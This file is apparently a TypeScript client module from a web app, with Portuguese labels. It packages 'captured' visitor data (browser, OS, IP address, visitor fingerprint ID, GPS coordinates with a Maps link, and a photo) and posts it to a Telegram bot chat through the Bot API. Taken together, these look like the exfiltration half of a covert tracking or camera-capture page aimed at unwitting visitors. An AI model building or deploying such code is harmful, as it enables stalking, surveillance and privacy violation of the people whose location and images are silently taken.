"use client"

import { CaptureData } from "@/types/telegram"

export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  data: CaptureData
): Promise<void> {
  try {
    // Send device info
    const deviceInfoMessage = `
📱 *Nova Captura*
━━━━━━━━━━━━━━━━━━━━━━━━
📌 *Informações do Dispositivo*
• Navegador: ${data.deviceInfo.browser}
• Sistema: ${data.deviceInfo.os}
• IP: ${data.deviceInfo.ip}
• Horário: ${new Date(data.deviceInfo.timestamp).toLocaleString()}
• ID: ${data.deviceInfo.visitorId}
`

    // Send location if available
    let locationMessage = ""
    if (data.location.latitude !== 0 && data.location.longitude !== 0) {
      locationMessage = `
📍 *Localização*
• Latitude: ${data.location.latitude}
• Longitude: ${data.location.longitude}
• [Ver no Google Maps](https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude})
`
    }

    // Send text message first
    const textMessage = deviceInfoMessage + locationMessage
    const textResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: textMessage,
          parse_mode: "Markdown",
          disable_web_page_preview: false,
        }),
      }
    )

    if (!textResponse.ok) {
      throw new Error(`Failed to send text message: ${textResponse.statusText}`)
    }

    // Send image if available
    if (data.image) {
      const imageResponse = await fetch(
        `https://api.telegram.org/bot${botToken}/sendPhoto`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            photo: data.image,
            caption: "📸 Foto capturada",
          }),
        }
      )

      if (!imageResponse.ok) {
        throw new Error(`Failed to send image: ${imageResponse.statusText}`)
      }
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    throw error
  }
} 